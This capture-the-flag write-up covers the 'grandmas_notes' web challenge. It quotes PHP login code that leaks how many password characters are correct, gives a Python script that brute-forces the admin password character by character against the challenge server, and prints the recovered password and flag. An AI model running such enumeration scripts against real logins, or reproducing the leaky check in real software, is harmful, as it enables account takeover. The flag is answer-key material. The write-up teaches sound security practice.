#  grandmas_notes

```
@gehaxelt

My grandma is into vibe coding and has developed this web application to help her remember all the important information. It would work be great, if she wouldn't keep forgetting her password, but she's found a solution for that, too.
http://52.59.124.14:5015 
```

A web application is provided in the attachment. The login logic tells us the number of correct characters:

```php
$correct = 0;
$limit = min(count($chars), count($stored));
for ($i = 0; $i < $limit; $i++) {
    $enteredCharHash = sha256_hex($chars[$i]);
    if (hash_equals($stored[$i]['char_hash'], $enteredCharHash)) {
        $correct++;
    } else {
        break;
    }
}
$_SESSION['flash'] = "Invalid password, but you got {$correct} characters correct!";
```

So we just enumerate each password character to find the correct password:

```python
import requests

password = ""
for i in range(20):
    password += " "
    for ch in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
        password = password[:-1] + ch
        print(password)
        r = requests.post(
            "http://52.59.124.14:5015/login.php",
            data={"username": "admin", "password": password},
        )
        if "characters correct!" in r.text:
            parts = r.text.split(" ")
            count = int(parts[parts.index("characters") - 1])
            if count == len(password):
                break
        else:
            print(password, r.text)
            exit(0)
```

The correct password for `admin` is `YzUnh2ruQix9mBWv`.

Get flag: `ENO{V1b3_C0D1nG_Gr4nDmA_Bu1ld5_InS3cUr3_4PP5!!}`.
